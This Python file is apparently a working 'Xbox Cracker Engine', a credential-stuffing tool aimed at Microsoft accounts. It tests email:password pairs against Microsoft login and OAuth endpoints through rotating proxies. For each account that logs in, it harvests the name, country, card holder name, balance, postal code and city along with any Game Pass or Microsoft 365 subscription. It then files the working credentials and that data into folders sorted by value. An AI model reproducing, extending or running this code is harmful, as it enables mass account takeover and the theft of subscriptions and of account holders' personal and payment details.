"""
Xbox Cracker Engine - EXACT replication of xbox (2).py logic
All checks, statuses, and result management preserved.
"""

import re
import uuid
import time
import os
import json
import requests
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, unquote
from threading import Lock
import logging

logger = logging.getLogger(__name__)


class XboxChecker:
    """Exact copy from xbox (2).py - no changes"""
    
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager
        
    def get_session(self):
        session = requests.Session()
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session
    
    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            
            date_str = date_str.replace('Z', '+00:00')
            
            try:
                renewal_date = datetime.fromisoformat(date_str)
            except:
                try:
                    renewal_date = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S%z")
                except:
                    try:
                        renewal_date = datetime.strptime(date_str.split('+')[0].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        renewal_date = renewal_date.replace(tzinfo=datetime.now().astimezone().tzinfo)
                    except:
                        return "UNKNOWN"
            
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            
            if remaining < 0:
                return "EXPIRED"
            return str(remaining)
            
        except Exception:
            return "UNKNOWN"
    
    def check(self, email, password):
        try:
            session = self.get_session()
            correlation_id = str(uuid.uuid4())
            
            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            
            r1 = session.get(url1, headers=headers1, timeout=15)
            
            # EXACT original checks
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD"}
            
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}
            
            time.sleep(0.5)
            
            url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" + email + "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            
            if not url_match or not ppft_match:
                return {"status": "BAD"}
            
            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            
            login_data = "i13=1&login=" + email + "&loginfmt=" + email + "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=" + password + "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=" + ppft + "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
            
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)
            
            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return {"status": "BAD"}
            
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA", "email": email, "password": password}
            
            # EXACT: Check for banned/abuse
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED"}
            
            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}
            
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}
            
            code = code_match.group(1)
            
            mspcid = session.cookies.get("MSPCID", "")
            if not mspcid:
                return {"status": "BAD"}
            
            cid = mspcid.upper()
            
            token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=" + code + "&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            
            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                            data=token_data, 
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            timeout=15)
            
            if "access_token" not in r4.text:
                return {"status": "BAD"}
            
            token_json = r4.json()
            access_token = token_json["access_token"]
            
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": "Bearer " + access_token,
                "X-AnchorMailbox": "CID:" + cid
            }
            
            country = ""
            name = ""
            
            try:
                r5 = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                headers=profile_headers, timeout=15)
                
                if r5.status_code == 200:
                    profile = r5.json()
                    
                    if "location" in profile and profile["location"]:
                        location_val = profile["location"]
                        if isinstance(location_val, str):
                            country = location_val.split(',')[-1].strip()
                        elif isinstance(location_val, dict):
                            country = location_val.get("country", "")
                    
                    if "displayName" in profile and profile["displayName"]:
                        name = profile["displayName"]
            except:
                pass
            
            time.sleep(0.5)
            
            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=" + quote(state_json) + "&prompt=none"
            
            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)
            
            payment_token = None
            search_text = r6.text + " " + r6.url
            
            token_patterns = [
                r'access_token=([^&\s"\']+)',
                r'"access_token":"([^"]+)"'
            ]
            
            for pattern in token_patterns:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break
            
            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}
            
            payment_data = {"country": country, "name": name}
            
            correlation_id2 = str(uuid.uuid4())
            
            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }
            
            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)
                
                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)
                    
                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)
                    
                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)
                    
                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)
                    
                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except:
                pass
            
            subscription_data = {}
            
            try:
                trans_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                r8 = session.get(trans_url, headers=payment_headers, timeout=15)
                
                if r8.status_code == 200:
                    response_text = r8.text
                    
                    # EXACT original premium keywords (including Minecraft Realms, Skype)
                    premium_keywords = {
                        'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'Game Pass Ultimate': 'GAME PASS ULTIMATE',
                        'PC Game Pass': 'PC GAME PASS',
                        'Xbox Game Pass for Console': 'XBOX GAME PASS CONSOLE',
                        'Xbox Game Pass Core': 'GAME PASS CORE',
                        'Game Pass Core': 'GAME PASS CORE',
                        'Xbox Game Pass': 'GAME PASS',
                        'Game Pass': 'GAME PASS',
                        'Xbox Live Gold': 'XBOX LIVE GOLD',
                        'EA Play': 'EA PLAY',
                        'Microsoft 365 Family': 'M365 FAMILY',
                        'Microsoft 365 Personal': 'M365 PERSONAL',
                        'Microsoft 365 Basic': 'M365 BASIC',
                        'Office 365 Home': 'OFFICE 365 HOME',
                        'Office 365 Personal': 'OFFICE 365 PERSONAL',
                        'Minecraft': 'MINECRAFT',
                        'Minecraft Realms': 'MINECRAFT REALMS',
                        'Skype': 'SKYPE',
                    }
                    
                    renewal_match = re.search(r'"nextRenewalDate"\s*:\s*"([^"]+)"', response_text)
                    
                    if not renewal_match:
                        return {"status": "FREE", "data": payment_data}
                    
                    renewal_date = renewal_match.group(1)
                    days_remaining = self.get_remaining_days(renewal_date)
                    
                    if days_remaining == "EXPIRED":
                        for keyword, type_name in premium_keywords.items():
                            if keyword.lower() in response_text.lower():
                                subscription_data['premium_type'] = type_name
                                break
                        
                        return {"status": "EXPIRED", "data": {**payment_data, **subscription_data, "renewal_date": renewal_date}}
                    
                    has_premium = False
                    premium_type = "UNKNOWN"
                    
                    for keyword, type_name in premium_keywords.items():
                        if keyword.lower() in response_text.lower():
                            has_premium = True
                            premium_type = type_name
                            break
                    
                    if has_premium:
                        subscription_data['premium_type'] = premium_type
                        subscription_data['renewal_date'] = renewal_date
                        subscription_data['days_remaining'] = days_remaining
                        
                        auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', response_text)
                        if auto_match:
                            subscription_data['auto_renew'] = "YES" if auto_match.group(1) == "true" else "NO"
                        
                        amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', response_text)
                        if amount_match:
                            subscription_data['total_amount'] = amount_match.group(1)
                        
                        currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', response_text)
                        if currency_match:
                            subscription_data['currency'] = currency_match.group(1)
                        
                        return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
                    else:
                        return {"status": "FREE", "data": {**payment_data, "renewal_date": renewal_date, "days_remaining": days_remaining}}
                        
            except:
                pass
            
            return {"status": "FREE", "data": payment_data}
            
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except Exception:
            return {"status": "ERROR"}


class XboxResultManager:
    """Exact copy from xbox (2).py - folder structure and saving logic"""
    
    def __init__(self, base_folder=None):
        if base_folder is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            base_folder = f"results/xbox_{timestamp}"
        
        self.base_folder = base_folder
        
        self.premium_folder = os.path.join(self.base_folder, "premium")
        self.free_folder = os.path.join(self.base_folder, "free")
        self.bad_folder = os.path.join(self.base_folder, "bad")
        self.expired_folder = os.path.join(self.base_folder, "expired")
        
        self.gamepass_ultimate_folder = os.path.join(self.premium_folder, "gamepass_ultimate")
        self.gamepass_pc_folder = os.path.join(self.premium_folder, "gamepass_pc")
        self.gamepass_console_folder = os.path.join(self.premium_folder, "gamepass_console")
        self.gamepass_core_folder = os.path.join(self.premium_folder, "gamepass_core")
        self.gamepass_other_folder = os.path.join(self.premium_folder, "gamepass_other")
        self.m365_folder = os.path.join(self.premium_folder, "microsoft_365")
        self.other_premium_folder = os.path.join(self.premium_folder, "other")
        
        Path(self.premium_folder).mkdir(parents=True, exist_ok=True)
        Path(self.free_folder).mkdir(parents=True, exist_ok=True)
        Path(self.bad_folder).mkdir(parents=True, exist_ok=True)
        Path(self.expired_folder).mkdir(parents=True, exist_ok=True)
        
        Path(self.gamepass_ultimate_folder).mkdir(parents=True, exist_ok=True)
        Path(self.gamepass_pc_folder).mkdir(parents=True, exist_ok=True)
        Path(self.gamepass_console_folder).mkdir(parents=True, exist_ok=True)
        Path(self.gamepass_core_folder).mkdir(parents=True, exist_ok=True)
        Path(self.gamepass_other_folder).mkdir(parents=True, exist_ok=True)
        Path(self.m365_folder).mkdir(parents=True, exist_ok=True)
        Path(self.other_premium_folder).mkdir(parents=True, exist_ok=True)
        
        self.premium_file = os.path.join(self.premium_folder, "all_premium.txt")
        self.free_file = os.path.join(self.free_folder, "free_accounts.txt")
        self.bad_file = os.path.join(self.bad_folder, "invalid_accounts.txt")
        self.expired_file = os.path.join(self.expired_folder, "expired_subscriptions.txt")
        
        self.gamepass_ultimate_file = os.path.join(self.gamepass_ultimate_folder, "gamepass_ultimate.txt")
        self.gamepass_pc_file = os.path.join(self.gamepass_pc_folder, "pc_gamepass.txt")
        self.gamepass_console_file = os.path.join(self.gamepass_console_folder, "console_gamepass.txt")
        self.gamepass_core_file = os.path.join(self.gamepass_core_folder, "gamepass_core.txt")
        self.gamepass_other_file = os.path.join(self.gamepass_other_folder, "other_gamepass.txt")
        self.m365_file = os.path.join(self.m365_folder, "microsoft_365.txt")
        self.other_premium_file = os.path.join(self.other_premium_folder, "other_premium.txt")
        
        self.counts = {
            'premium_all': 0,
            'premium_ultimate': 0,
            'premium_pc': 0,
            'premium_console': 0,
            'premium_core': 0,
            'premium_m365': 0,
            'free': 0,
            'expired': 0,
            'bad': 0
        }
    
    def save_result(self, email, password, result):
        status = result['status']
        data = result.get('data', {})
        
        line = email + ":" + password
        capture = []
        
        if status == "PREMIUM":
            premium_type = data.get('premium_type', 'UNKNOWN')
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            days_remaining = data.get('days_remaining', '0')
            auto_renew = data.get('auto_renew', 'NO')
            renewal_date = data.get('renewal_date', 'N/A')
            
            capture.append("Type: " + premium_type)
            if name:
                capture.append("Name: " + name)
            capture.append("Country: " + country)
            capture.append("Days: " + days_remaining)
            capture.append("AutoRenew: " + auto_renew)
            capture.append("Renewal: " + renewal_date)
            
            if 'card_holder' in data:
                capture.append("Card: " + data['card_holder'])
            if 'balance' in data and data['balance'] != "$0.0":
                capture.append("Balance: " + data['balance'])
            
            full_line = line + " | " + " | ".join(capture) + "\n"
            
            self.counts['premium_all'] += 1
            
            with open(self.premium_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
            
            premium_type_upper = premium_type.upper()
            
            if "ULTIMATE" in premium_type_upper:
                with open(self.gamepass_ultimate_file, 'a', encoding='utf-8') as f:
                    f.write(full_line)
                self.counts['premium_ultimate'] += 1
            elif "PC" in premium_type_upper and "GAME PASS" in premium_type_upper:
                with open(self.gamepass_pc_file, 'a', encoding='utf-8') as f:
                    f.write(full_line)
                self.counts['premium_pc'] += 1
            elif "CONSOLE" in premium_type_upper:
                with open(self.gamepass_console_file, 'a', encoding='utf-8') as f:
                    f.write(full_line)
                self.counts['premium_console'] += 1
            elif "CORE" in premium_type_upper:
                with open(self.gamepass_core_file, 'a', encoding='utf-8') as f:
                    f.write(full_line)
                self.counts['premium_core'] += 1
            elif "GAME PASS" in premium_type_upper or "XBOX LIVE GOLD" in premium_type_upper or "EA PLAY" in premium_type_upper:
                with open(self.gamepass_other_file, 'a', encoding='utf-8') as f:
                    f.write(full_line)
                self.counts['premium_other'] = self.counts.get('premium_other', 0) + 1
            elif "M365" in premium_type_upper or "OFFICE" in premium_type_upper:
                with open(self.m365_file, 'a', encoding='utf-8') as f:
                    f.write(full_line)
                self.counts['premium_m365'] += 1
            else:
                with open(self.other_premium_file, 'a', encoding='utf-8') as f:
                    f.write(full_line)
                self.counts['premium_other'] = self.counts.get('premium_other', 0) + 1
        
        elif status == "EXPIRED":
            premium_type = data.get('premium_type', 'UNKNOWN')
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            renewal_date = data.get('renewal_date', 'N/A')
            
            capture.append("Type: " + premium_type + " (EXPIRED)")
            if name:
                capture.append("Name: " + name)
            capture.append("Country: " + country)
            capture.append("Expired: " + renewal_date)
            
            if 'card_holder' in data:
                capture.append("Card: " + data['card_holder'])
            if 'balance' in data and data['balance'] != "$0.0":
                capture.append("Balance: " + data['balance'])
            
            full_line = line + " | " + " | ".join(capture) + "\n"
            
            with open(self.expired_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
            self.counts['expired'] += 1
        
        elif status == "FREE":
            country = data.get('country', 'N/A')
            name = data.get('name', '')
            
            if name:
                capture.append("Name: " + name)
            capture.append("Country: " + country)
            
            if 'card_holder' in data:
                capture.append("Card: " + data['card_holder'])
            if 'renewal_date' in data:
                capture.append("Had Renewal: " + data['renewal_date'])
            
            full_line = line + " | " + " | ".join(capture) + "\n"
            
            with open(self.free_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
            self.counts['free'] += 1
        
        elif status in ["BAD", "ERROR", "TIMEOUT", "BANNED"]:
            full_line = line + " | Status: " + status + "\n"
            
            with open(self.bad_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
            self.counts['bad'] += 1
        
        elif status == "2FA":
            full_line = line + " | 2FA REQUIRED\n"
            
            with open(self.bad_file, 'a', encoding='utf-8') as f:
                f.write(full_line)
            self.counts['bad'] += 1
    
    def get_counts(self):
        return self.counts


class XboxCrackerStats:
    """Thread-safe statistics wrapper (optional)"""
    
    def __init__(self):
        self.lock = Lock()
        self.total_checked = 0
        self.total_hits = 0
        self.premium_hits = 0
        self.free_hits = 0
        self.expired_hits = 0
        self.bad_accounts = 0
        self.timeouts = 0
        self.errors = 0
        
        self.gamepass_ultimate = 0
        self.gamepass_pc = 0
        self.gamepass_console = 0
        self.gamepass_core = 0
        self.gamepass_other = 0
        self.m365_hits = 0
        self.other_premium = 0
    
    def increment(self, key: str, value: int = 1):
        with self.lock:
            if hasattr(self, key):
                setattr(self, key, getattr(self, key) + value)
    
    def get_stats(self) -> dict:
        with self.lock:
            return {
                "total_checked": self.total_checked,
                "total_hits": self.total_hits,
                "premium_hits": self.premium_hits,
                "free_hits": self.free_hits,
                "expired_hits": self.expired_hits,
                "bad_accounts": self.bad_accounts,
                "timeouts": self.timeouts,
                "errors": self.errors,
                "gamepass_ultimate": self.gamepass_ultimate,
                "gamepass_pc": self.gamepass_pc,
                "gamepass_console": self.gamepass_console,
                "gamepass_core": self.gamepass_core,
                "gamepass_other": self.gamepass_other,
                "m365_hits": self.m365_hits,
                "other_premium": self.other_premium
            }
    
    def reset(self):
        with self.lock:
            self.total_checked = 0
            self.total_hits = 0
            self.premium_hits = 0
            self.free_hits = 0
            self.expired_hits = 0
            self.bad_accounts = 0
            self.timeouts = 0
            self.errors = 0
            self.gamepass_ultimate = 0
            self.gamepass_pc = 0
            self.gamepass_console = 0
            self.gamepass_core = 0
            self.gamepass_other = 0
            self.m365_hits = 0
            self.other_premium = 0


class XboxCrackerEngine:
    """
    Production engine that uses the EXACT xbox (2).py logic.
    Combines XboxChecker + XboxResultManager with optional statistics.
    """
    
    def __init__(self, output_dir: str = None):
        """
        Args:
            output_dir: If None, auto-generates timestamped folder like original.
                        If provided, uses that as base folder.
        """
        self.result_manager = XboxResultManager(base_folder=output_dir)
        self.checker = XboxChecker()
        self.stats = XboxCrackerStats()
    
    def check_account(self, email: str, password: str) -> dict:
        """Check a single account and save result automatically"""
        self.stats.increment("total_checked")
        
        result = self.checker.check(email, password)
        
        # Update stats based on result
        status = result.get("status")
        if status == "PREMIUM":
            self.stats.increment("total_hits")
            self.stats.increment("premium_hits")
            # Categorize premium type for stats
            data = result.get("data", {})
            ptype = data.get("premium_type", "").upper()
            if "ULTIMATE" in ptype:
                self.stats.increment("gamepass_ultimate")
            elif "PC" in ptype and "GAME PASS" in ptype:
                self.stats.increment("gamepass_pc")
            elif "CONSOLE" in ptype:
                self.stats.increment("gamepass_console")
            elif "CORE" in ptype:
                self.stats.increment("gamepass_core")
            elif "M365" in ptype or "OFFICE" in ptype:
                self.stats.increment("m365_hits")
            elif "GAME PASS" in ptype or "XBOX LIVE GOLD" in ptype or "EA PLAY" in ptype:
                self.stats.increment("gamepass_other")
            else:
                self.stats.increment("other_premium")
        elif status == "FREE":
            self.stats.increment("total_hits")
            self.stats.increment("free_hits")
        elif status == "EXPIRED":
            self.stats.increment("total_hits")
            self.stats.increment("expired_hits")
        elif status == "BAD":
            self.stats.increment("bad_accounts")
        elif status == "TIMEOUT":
            self.stats.increment("timeouts")
        elif status == "ERROR":
            self.stats.increment("errors")
        elif status == "BANNED":
            self.stats.increment("bad_accounts")
        elif status == "2FA":
            self.stats.increment("bad_accounts")
        
        # Save using original result manager
        self.result_manager.save_result(email, password, result)
        
        return result
    
    def get_stats(self) -> dict:
        """Get combined stats from both result manager and internal stats"""
        stats = self.stats.get_stats()
        stats.update(self.result_manager.get_counts())
        return stats
    
    def reset_stats(self):
        """Reset internal statistics (does not clear saved files)"""
        self.stats.reset()
    
    def get_base_folder(self) -> str:
        """Get the output folder path"""
        return self.result_manager.base_folder